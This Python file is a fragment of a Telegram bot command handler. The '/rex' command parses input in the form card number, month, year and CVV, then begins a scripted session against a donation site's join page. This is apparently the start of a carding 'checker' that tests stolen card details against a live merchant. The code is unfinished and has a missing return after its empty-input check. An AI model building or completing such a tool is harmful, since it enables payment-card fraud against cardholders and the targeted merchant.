import json
import requests
import time
import asyncio

from asyncio import sleep
from pyrogram import Client, filters
#from configs import Config                         # aqui dice que de configs importe lan classe config
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)

@Client.on_message(filters.command(["rex"], ["/", "."]))
async def binio(_, m: Message):
    ini = time.perf_counter()
    ccs = m.text[len('/rex '):]

    if not ccs:
           await m.reply("<b>/rex cc|mes|ano|cvv</b>")

    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]
    session = requests.Session()
    req_1 = session.get('https://dollardonationclub.com/join/rivers').text
    
    print(req_1)